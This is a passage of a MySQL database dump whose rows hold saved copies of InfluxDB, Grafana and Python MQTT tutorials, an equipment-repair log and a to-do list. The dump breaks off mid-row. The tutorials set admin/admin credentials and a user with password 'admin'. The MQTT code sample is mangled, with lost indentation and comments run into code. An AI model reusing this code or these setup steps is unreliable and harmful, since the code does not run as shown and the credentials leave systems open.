</tbody>\r\n</table>\r\n\r\n<p>在test库中新建了一个名为redis_30m的连续查询，每三十分钟取一个connected_clients字段的平均值、中位值、最大值、最小值redis_clients_30m表中。使用的数据保留策略都是default。</p>\r\n\r\n<p>显示或删除所有已存在的连续查询</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>SHOW CONTINUOUS QUERIES</p>\r\n\r\n			<p>DROP CONTINUOUS QUERY &lt;cq_name&gt; ON &lt;database_name&gt;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>6）数据保存策略（Retention Policies）</strong></p>\r\n\r\n<p>InfluxDB是没有提供直接删除数据记录的方法，但是提供数据保存策略，主要用于指定数据保留时间，超过指定时间，就删除这部分数据。</p>\r\n\r\n<p><strong>6.1 查看当前数据库Retention Policies</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n			</td>\r\n			<td>\r\n			<p>show retention policies on &quot;db_name&quot;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>6.2 创建新的Retention Policies</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n			</td>\r\n			<td>\r\n			<p>create retention policy &quot;rp_name&quot; on &quot;db_name&quot; duration 3w replication 1 default</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>rp_name：策略名;</p>\r\n\r\n<p>db_name：具体的数据库名;</p>\r\n\r\n<p>3w：保存3周，3周之前的数据将被删除，influxdb具有各种事件参数，比如：h（小时），d（天），w（星期）;</p>\r\n\r\n<p>replication 1：副本个数，一般为1就可以了;</p>\r\n\r\n<p>default：设置为默认策略;</p>\r\n\r\n<p><strong>6.3 修改Retention Policies</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n			</td>\r\n			<td>\r\n			<p>alter retention policy &quot;rp_name&quot; on &quot;db_name&quot; duration 30d default</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>6.4 删除Retention Policies</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n			</td>\r\n			<td>\r\n			<p>drop retention policy &quot;rp_name&quot;</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h3>六、结合Grafana使用</h3>\r\n\r\n<p><strong>1）安装配置Grafana</strong></p>\r\n\r\n<p>CentOS系列使用YUM安装</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>$ wget https://s3-us-west-2.amazonaws.com/grafana-releases/release/grafana-4.2.0-1.x86_64.rpm</p>\r\n\r\n			<p>$ sudo yum localinstall grafana-4.2.0-1.x86_64.rpm</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>或者</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>$ yum install initscripts fontconfig</p>\r\n\r\n			<p>$ rpm -Uvh grafana-3.1.1-1470047149.x86_64.rpm</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>Systemd方式启动Grafana</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n			</td>\r\n			<td>\r\n			<p>$ systemctl daemon-reload</p>\r\n\r\n			<p>$ systemctl start grafana-server</p>\r\n\r\n			<p>$ systemctl status grafana-server</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>启动Granfa之后，进程名称为grafana-server。将会默认使用grafana用户和组运行Granfa进程。默认会开启HTTP的3000端口。启动服务之后直接直接在浏览器访问<a href=\"http://ip:3000/\">http://IP:3000</a>就会出现如下界面，默认账号和用户名为admin/admin，在/etc/grafana/grafana.ini配置文件中可修改。</p>\r\n\r\n<p>详细：<a href=\"http://www.ywnds.com/?p=5903\">Grafana安装配置介绍</a></p>\r\n\r\n<p><strong>2）InfluxDB添加用户</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n			</td>\r\n			<td>\r\n			<p>create user &quot;admin&quot; with password &#39;admin&#39; with all privileges</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>3）InfluxDB插入数据</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>&gt; use test;</p>\r\n\r\n			<p>&gt; insert disk,hostname=server01,device=/data free=80,used=100,used_percent=98.33,count=1</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>4）Grafana添加IfluxDB为数据源</strong></p>\r\n\r\n<p><a href=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080707130522.jpg\"><img alt=\"玩转时序数据库InfluxDB\" src=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080707130522-410x500.jpg\" /></a></p>\r\n\r\n<p>然后就可以开始画图了。</p>\r\n\r\n<p><a href=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080707213862.jpg\"><img alt=\"玩转时序数据库InfluxDB\" src=\"http://www.ywnds.com/wp-content/uploads/2017/08/2017080707213862-657x500.jpg\" /></a></p>\r\n\r\n<p>InfluxDB中的tags可以作为条件，如hostname或device，而field可以作为value。</p>\r\n\r\n<h3>七、Python操作InfluxDB</h3>\r\n\r\n<p><strong>1）安装infludb驱动</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n			</td>\r\n			<td>\r\n			<p>$ yum install python-pip</p>\r\n\r\n			<p>$ pip install influxdb</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p><strong>2）基本操作</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n\r\n			<p>7</p>\r\n\r\n			<p>8</p>\r\n\r\n			<p>9</p>\r\n\r\n			<p>10</p>\r\n\r\n			<p>11</p>\r\n\r\n			<p>12</p>\r\n\r\n			<p>13</p>\r\n\r\n			<p>14</p>\r\n\r\n			<p>15</p>\r\n\r\n			<p>16</p>\r\n\r\n			<p>17</p>\r\n\r\n			<p>18</p>\r\n\r\n			<p>19</p>\r\n\r\n			<p>20</p>\r\n\r\n			<p>21</p>\r\n\r\n			<p>22</p>\r\n\r\n			<p>23</p>\r\n\r\n			<p>24</p>\r\n\r\n			<p>25</p>\r\n\r\n			<p>26</p>\r\n\r\n			<p>27</p>\r\n\r\n			<p>28</p>\r\n\r\n			<p>29</p>\r\n\r\n			<p>30</p>\r\n\r\n			<p>31</p>\r\n\r\n			<p>32</p>\r\n\r\n			<p>33</p>\r\n\r\n			<p>34</p>\r\n\r\n			<p>35</p>\r\n\r\n			<p>36</p>\r\n\r\n			<p>37</p>\r\n\r\n			<p>38</p>\r\n\r\n			<p>39</p>\r\n			</td>\r\n			<td>\r\n			<p>#! /usr/bin/env python</p>\r\n\r\n			<p>#-*- coding:utf-8 -*-</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p>from influxdb import InfluxDBClient</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p>json_body = [</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;{</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;measurement&quot;: &quot;disk&quot;,</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;tags&quot;: {</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;hostname&quot;: &quot;server01&quot;,</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;device&quot;:&quot;/data&quot;</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;},</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;fields&quot;: {</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;free&quot;: 89,</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;used&quot;: 100</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;}</p>\r\n\r\n			<p>]</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查看数据;</p>\r\n\r\n			<p>def showDBNames(client):</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;result = client.query(&#39;show measurements;&#39;)</p>\r\n\r\n			<p>&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Result: {0}&quot;.format(result))</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 初始化连接(指定要操作的数据库);</p>\r\n\r\n			<p>client = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;test&#39;)</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查看表;</p>\r\n\r\n			<p>showDBNames(client)</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 写入数据,同时创建表;</p>\r\n\r\n			<p>client.write_points(json_body)</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 查看表;</p>\r\n\r\n			<p>showDBNames(client)</p>\r\n\r\n			<p>&nbsp;</p>\r\n\r\n			<p># 删除表;</p>\r\n\r\n			<p>client.query(&quot;drop measurement students&quot;)</p>\r\n\r\n			<p>showDBNames(client)</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>InfluxDB中文文档：<a href=\"https://github.com/jasper-zhang/influxdb-document-cn\">https://github.com/jasper-zhang/influxdb-document-cn</a></p>\r\n','2018-03-02 09:27:15','玩转时序数据库InfluxDB'),(91,'yebin','<p><a href=\"http://log.satelc.com/add_log\" target=\"_blank\">原文链接</a></p>\r\n\r\n<p>环境： CentOS6.5_x64<br />\r\nInfluxDB版本：1.1.0<br />\r\nPython版本 ： 2.6</p>\r\n\r\n<h2>准备工作</h2>\r\n\r\n<ul>\r\n	<li>启动服务器</li>\r\n</ul>\r\n\r\n<p>　　执行如下命令：</p>\r\n\r\n<pre>\r\n<code>　　service influxdb start</code></pre>\r\n\r\n<p>　　示例如下：</p>\r\n\r\n<pre>\r\n[root@localhost ~]# service influxdb start\r\nStarting influxdb...\r\ninfluxdb process was started [ OK ]\r\n[root@localhost ~]#</pre>\r\n\r\n<ul>\r\n	<li>安装influxdb-python</li>\r\n</ul>\r\n\r\n<p>github地址：&nbsp;<a href=\"https://github.com/influxdata/influxdb-python\">https://github.com/influxdata/influxdb-python</a></p>\r\n\r\n<p>安装pip ：&nbsp;</p>\r\n\r\n<pre>\r\n<code>yum install python-pip</code></pre>\r\n\r\n<p>安装influxdb-python ：</p>\r\n\r\n<pre>\r\n<code>pip install influxdb </code></pre>\r\n\r\n<h2>基本操作</h2>\r\n\r\n<p>使用InfluxDBClient类操作数据库，示例如下：</p>\r\n\r\n<pre>\r\nfrom influxdb import InfluxDBClient\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;&#39;) # 初始化</pre>\r\n\r\n<ul>\r\n	<li>显示已存在的所有数据库</li>\r\n</ul>\r\n\r\n<p>　　使用get_list_database函数，示例如下：</p>\r\n\r\n<p>　　print client.get_list_database() # 显示所有数据库名称</p>\r\n\r\n<ul>\r\n	<li>创建新数据库</li>\r\n</ul>\r\n\r\n<p>　　使用create_database函数，示例如下：</p>\r\n\r\n<p>　　client.create_database(&#39;testdb&#39;) # 创建数据库</p>\r\n\r\n<ul>\r\n	<li>删除数据库</li>\r\n</ul>\r\n\r\n<p>　　使用drop_database函数，示例如下：&nbsp;</p>\r\n\r\n<p>　　client.drop_database(&#39;testdb&#39;) # 删除数据库&nbsp;</p>\r\n\r\n<p>数据库操作完整示例如下：</p>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<pre>\r\n#! /usr/bin/env python\r\n#-*- coding:utf-8 -*-\r\n\r\nfrom influxdb import InfluxDBClient\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;&#39;) # 初始化\r\nprint client.get_list_database() # 显示所有数据库名称\r\nclient.create_database(&#39;testdb&#39;) # 创建数据库\r\nprint client.get_list_database() # 显示所有数据库名称\r\nclient.drop_database(&#39;testdb&#39;) # 删除数据库\r\nprint client.get_list_database() # 显示所有数据库名称</pre>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<h3>表操作</h3>\r\n\r\n<p>InfluxDBClient中要指定连接的数据库，示例如下：</p>\r\n\r\n<pre>\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;testdb&#39;) # 初始化（指定要操作的数据库）</pre>\r\n\r\n<ul>\r\n	<li>显示指定数据库中已存在的表</li>\r\n</ul>\r\n\r\n<p>　　可以通过influxql语句实现，示例如下：</p>\r\n\r\n<pre>\r\nresult = client.query(&#39;show measurements;&#39;) # 显示数据库中的表\r\nprint(&quot;Result: {0}&quot;.format(result))</pre>\r\n\r\n<ul>\r\n	<li>创建新表并添加数据</li>\r\n</ul>\r\n\r\n<p>InfluxDB没有提供单独的建表语句，可以通过并添加数据的方式建表，示例如下：</p>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<pre>\r\njson_body = [\r\n    {\r\n        &quot;measurement&quot;: &quot;students&quot;,\r\n        &quot;tags&quot;: {\r\n            &quot;stuid&quot;: &quot;s123&quot;\r\n        },\r\n        #&quot;time&quot;: &quot;2017-03-12T22:00:00Z&quot;,\r\n        &quot;fields&quot;: {\r\n            &quot;score&quot;: 89\r\n        }\r\n    }\r\n]\r\n\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;testdb&#39;) # 初始化（指定要操作的数据库）\r\nclient.write_points(json_body) # 写入数据，同时创建表</pre>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<ul>\r\n	<li>删除表</li>\r\n</ul>\r\n\r\n<p>可以通过influxql语句实现，示例如下：</p>\r\n\r\n<pre>\r\nclient.query(&quot;drop measurement students&quot;) # 删除表</pre>\r\n\r\n<p>数据表操作完整示例如下：</p>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<pre>\r\n#! /usr/bin/env python\r\n#-*- coding:utf-8 -*-\r\n\r\nfrom influxdb import InfluxDBClient\r\n\r\njson_body = [\r\n    {\r\n        &quot;measurement&quot;: &quot;students&quot;,\r\n        &quot;tags&quot;: {\r\n            &quot;stuid&quot;: &quot;s123&quot;\r\n        },\r\n        #&quot;time&quot;: &quot;2017-03-12T22:00:00Z&quot;,\r\n        &quot;fields&quot;: {\r\n            &quot;score&quot;: 89\r\n        }\r\n    }\r\n]\r\n\r\ndef showDBNames(client):\r\n        result = client.query(&#39;show measurements;&#39;) # 显示数据库中的表\r\n        print(&quot;Result: {0}&quot;.format(result))\r\n\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;testdb&#39;) # 初始化（指定要操作的数据库）\r\nshowDBNames(client)\r\nclient.write_points(json_body) # 写入数据，同时创建表\r\nshowDBNames(client)\r\nclient.query(&quot;drop measurement students&quot;) # 删除表\r\nshowDBNames(client)</pre>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<h2>数据操作</h2>\r\n\r\n<p>InfluxDBClient中要指定连接的数据库，示例如下：</p>\r\n\r\n<pre>\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;testdb&#39;) # 初始化（指定要操作的数据库）</pre>\r\n\r\n<ul>\r\n	<li>添加</li>\r\n</ul>\r\n\r\n<p>可以通过write_points实现，示例如下：</p>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<pre>\r\njson_body = [\r\n    {\r\n        &quot;measurement&quot;: &quot;students&quot;,\r\n        &quot;tags&quot;: {\r\n            &quot;stuid&quot;: &quot;s123&quot;\r\n        },\r\n        #&quot;time&quot;: &quot;2017-03-12T22:00:00Z&quot;,\r\n        &quot;fields&quot;: {\r\n            &quot;score&quot;: 89\r\n        }\r\n    }\r\n]\r\n\r\nclient.write_points(json_body) # 写入数据</pre>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<ul>\r\n	<li>查询</li>\r\n</ul>\r\n\r\n<p>可以通过influxql语句实现，示例如下：</p>\r\n\r\n<pre>\r\nresult = client.query(&#39;select * from students;&#39;)    \r\nprint(&quot;Result: {0}&quot;.format(result))</pre>\r\n\r\n<ul>\r\n	<li>更新</li>\r\n</ul>\r\n\r\n<p>tags 和 timestamp相同时数据会执行覆盖操作，相当于InfluxDB的更新操作。</p>\r\n\r\n<ul>\r\n	<li>删除</li>\r\n</ul>\r\n\r\n<p>使用influxql语句实现，delete语法，示例如下：</p>\r\n\r\n<pre>\r\nclient.query(&#39;delete from students;&#39;) # 删除数据</pre>\r\n\r\n<p>数据操作完整示例如下：</p>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<pre>\r\n#! /usr/bin/env python\r\n#-*- coding:utf-8 -*-\r\n\r\nfrom influxdb import InfluxDBClient\r\n\r\njson_body = [\r\n    {\r\n        &quot;measurement&quot;: &quot;students&quot;,\r\n        &quot;tags&quot;: {\r\n            &quot;stuid&quot;: &quot;s123&quot;\r\n        },\r\n        #&quot;time&quot;: &quot;2017-03-12T22:00:00Z&quot;,\r\n        &quot;fields&quot;: {\r\n            &quot;score&quot;: 89\r\n        }\r\n    }\r\n]\r\n\r\ndef showDatas(client):\r\n        result = client.query(&#39;select * from students;&#39;)\r\n        print(&quot;Result: {0}&quot;.format(result))\r\n\r\nclient = InfluxDBClient(&#39;localhost&#39;, 8086, &#39;root&#39;, &#39;&#39;, &#39;testdb&#39;) # 初始化\r\nclient.write_points(json_body) # 写入数据\r\nshowDatas(client)  # 查询数据\r\nclient.query(&#39;delete from students;&#39;) # 删除数据\r\nshowDatas(client)  # 查询数据</pre>\r\n\r\n<p><a href=\"javascript:void(0);\" onclick=\"copyCnblogsCode(this)\"><img alt=\"复制代码\" src=\"http://common.cnblogs.com/images/copycode.gif\" /></a></p>\r\n\r\n<p>好，就这些了，希望对你有帮助。</p>\r\n\r\n<p>本文github地址：</p>\r\n\r\n<p><a href=\"https://github.com/mike-zhang/mikeBlogEssays/blob/master/2017/20170312_%E4%BD%BF%E7%94%A8python%E6%93%8D%E4%BD%9CInfluxDB.md\" target=\"_blank\">https://github.com/mike-zhang/mikeBlogEssays/blob/master/2017/20170312_使用python操作InfluxDB.md</a></p>\r\n\r\n<p>欢迎补充&nbsp;</p>\r\n','2018-03-02 09:28:28','使用python操作InfluxDB'),(92,'yebin','<p><a href=\"http://www.steves-internet-guide.com/python-mqtt-publish-subscribe/\" target=\"_blank\">Original Link</a></p>\r\n\r\n<p>In this simple project we will be publish and subscribe to a topic, and then receive the published message.</p>\r\n\r\n<p>To do that we will need to first subscribe to the topic and then publish the messages.<br />\r\n&nbsp;</p>\r\n\r\n<p>We will publish and subscribe using the same client.</p>\r\n\r\n<p>The Code</p>\r\n\r\n<pre>\r\n<code>\r\nimport time\r\nimport paho.mqtt.client as paho\r\nbroker=&quot;broker.hivemq.com&quot;\r\nbroker=&quot;iot.eclipse.org&quot;\r\n#define callback\r\ndef on_message(client, userdata, message):\r\ntime.sleep(1)\r\nprint(&quot;received message =&quot;,str(message.payload.decode(&quot;utf-8&quot;)))\r\nclient= paho.Client(&quot;client-001&quot;) #create client object client1.on_publish = on_publish #assign function to callback client1.connect(broker,port) #establish connection client1.publish(&quot;house/bulb1&quot;,&quot;on&quot;)\r\n######Bind function to callback\r\nclient.on_message=on_message\r\n#####\r\nprint(&quot;connecting to broker &quot;,broker)\r\nclient.connect(broker)#connect\r\nclient.loop_start() #start loop to process received messages\r\nprint(&quot;subscribing &quot;)\r\nclient.subscribe(&quot;house/bulb1&quot;)#subscribe\r\ntime.sleep(2)\r\nprint(&quot;publishing &quot;)\r\nclient.publish(&quot;house/bulb1&quot;,&quot;on&quot;)#publish\r\ntime.sleep(4)\r\nclient.disconnect() #disconnect\r\nclient.loop_stop() #stop loop\r\n</code></pre>\r\n\r\n<p><strong>Note:</strong>&nbsp;You can copy the code direct from the page, paste it in a file and use.</p>\r\n\r\n<p>When we run the script we get</p>\r\n\r\n<p><img alt=\"pub-sub-code-output\" src=\"http://www.steves-internet-guide.com/wp-content/uploads/pub-sub-code-output.jpg\" style=\"height:154px; width:539px\" /></p>\r\n\r\n<h3>Code Explanation and Notes</h3>\r\n\r\n<p>I use the<strong>&nbsp;time.sleep()</strong>&nbsp;function to insert delays so as to give the client time to connect etc.</p>\r\n\r\n<p>We publish and subscribe using the same client.</p>\r\n\r\n<p>The&nbsp;<strong>client.loop()</strong>&nbsp;is important otherwise the callbacks aren&rsquo;t triggered.</p>\r\n\r\n<p>The&nbsp;<strong>on message</strong>&nbsp;callback function catches the callback and the&nbsp;<strong><code>client.on_message=on_message</code></strong>binds the function to the callback.</p>\r\n\r\n<p>There is no error checking i.e. I don&rsquo;t check for a successful connection before publishing, and subscribing.</p>\r\n\r\n<p>I have two free external brokers listed as sometimes the brokers are down and you will need to use the other one. Just comment out the one you aren&rsquo;t using.</p>\r\n\r\n<p>I&rsquo;ve used the topic house/bulb1 you can use any topic name you want.</p>\r\n\r\n<h3>Questions and Things to Try</h3>\r\n\r\n<ol>\r\n	<li>What would happen if I published before I subscribed?</li>\r\n	<li>What would happen if I didn&rsquo;t start the loop?</li>\r\n	<li>What would happen if I didn&rsquo;t bind the<strong>&nbsp;on_message</strong>&nbsp;function to the callback?</li>\r\n</ol>\r\n\r\n<p>Answers below</p>\r\n\r\n<p><strong>Useful Tutorials and Resources:</strong></p>\r\n\r\n<ul>\r\n	<li><a href=\"http://www.steves-internet-guide.com/mqtt-python-callbacks/\">Understanding Callbacks -Using The Python MQTT Client</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/subscribing-topics-mqtt-client/\">Understanding MQTT Subscribe- Option Examples</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/client-objects-python-mqtt/\">Client Objects-Working with The Python MQTT Client</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/into-mqtt-python-client/\">The Paho MQTT Python Client-Beginners Guide</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/client-connections-python-mqtt/\">Working with Client Connections- Python MQTT</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/publishing-messages-mqtt-client/\">MQTT Publish-Python MQTT Client Examples</a></li>\r\n	<li><a href=\"http://www.steves-internet-guide.com/send-json-data-mqtt-python/\">Sending JSON Data Over MQTT using Python</a></li>\r\n</ul>\r\n\r\n<p>Answers</p>\r\n\r\n<ol>\r\n	<li>The message would be discarded by the broker.</li>\r\n	<li>You wouldn&rsquo;t see the message.</li>\r\n	<li>You wouldn&rsquo;t see the message.</li>\r\n</ol>\r\n','2018-03-02 09:30:20','Simple Python MQTT Publish and Subscribe -Example'),(93,'yebin','<p>2018-3-6</p>\r\n\r\n<p>周浦监狱押送车发射机维修完成。</p>\r\n\r\n<p>南汇监狱押送车天线及吸盘维修完成。</p>\r\n\r\n<p>指挥车2号机接原3号机340MHz天线，3号机接原2号机天线，并将2号机天线换为新的3号机的505MHz天线。</p>\r\n','2018-03-06 09:51:48','上海新收监维修周浦和南汇');
/*!40000 ALTER TABLE `logs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `todo`
--

DROP TABLE IF EXISTS `todo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `todo` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `content` varchar(255) NOT NULL,
  `complete` tinyint(1) NOT NULL DEFAULT '0',
  `user` varchar(50) NOT NULL,
  `create_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=141 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `todo`
--

LOCK TABLES `todo` WRITE;
/*!40000 ALTER TABLE `todo` DISABLE KEYS */;
INSERT INTO `todo` VALUES (1,'待办测试项一',1,'yebin','2018-01-03 06:39:28'),(2,'待办测试项二',1,'yebin','2018-01-03 06:39:37'),(3,'待办测试项三',1,'yebin','2018-01-03 06:39:47'),(4,'待办测试项4',1,'yebin','2018-01-03 06:39:57'),(5,'待办测试项5',1,'yebin','2018-01-03 06:40:04'),(6,'待办测试项6',1,'yebin','2018-01-03 06:40:11'),(7,'To do list 7',1,'yebin','2018-01-03 06:40:20'),(8,'To do list 8',1,'yebin','2018-01-03 06:40:28'),(9,'To do list 9',1,'yebin','2018-01-03 06:40:35'),(10,'To do list 10',1,'yebin','2018-01-03 06:40:42'),(11,'TESTING TODO LIST.',1,'yebin','2018-01-03 07:14:12'),(12,'测试待办事项功能。',1,'yebin','2018-01-03 07:14:28'),(13,'换灯泡。',1,'yebin','2018-01-03 07:36:28'),(14,'2018年1月移动套餐结束时换成188无限流量套餐。',1,'yebin','2018-01-03 07:37:16'),(15,'湖北无委项目4G安装调试。',0,'yebin','2018-01-03 07:37:33'),(16,'开4G发票。',0,'yebin','2018-01-03 07:37:46'),(17,'黄石地面站控制器加入网络判断脚本。',1,'yebin','2018-01-03 07:38:12'),(18,'维修新收监iPad2中控。',1,'yebin','2018-01-03 07:38:33'),(19,'新收监图传更换及安装吸盘。',0,'yebin','2018-01-03 07:39:01'),(20,'金山民防车顶摄像机换回用户购买的型号。',0,'yebin','2018-01-03 07:39:27'),(21,'更换虹口民防指挥车左侧扬声器。',0,'yebin','2018-01-03 07:39:49'),(22,'虹口民防发电机保养。',0,'yebin','2018-01-03 07:40:02'),(23,'崇明民防发电机保养。',1,'yebin','2018-01-03 07:40:17'),(24,'崇明民防支撑腿故障。',0,'yebin','2018-01-03 07:40:33'),(25,'虹口民防4G待定。',0,'yebin','2018-01-03 07:40:46'),(26,'静安民防更换设备清单：工控机、KVM 和倒车影像。',0,'yebin','2018-01-03 07:41:15'),(27,'长宁民防警报器故障。',0,'yebin','2018-01-03 07:41:34'),(28,'湖北无委指挥车工控机和车顶右摄像头故障。',0,'yebin','2018-01-03 07:42:20'),(29,'Send email hourly to display 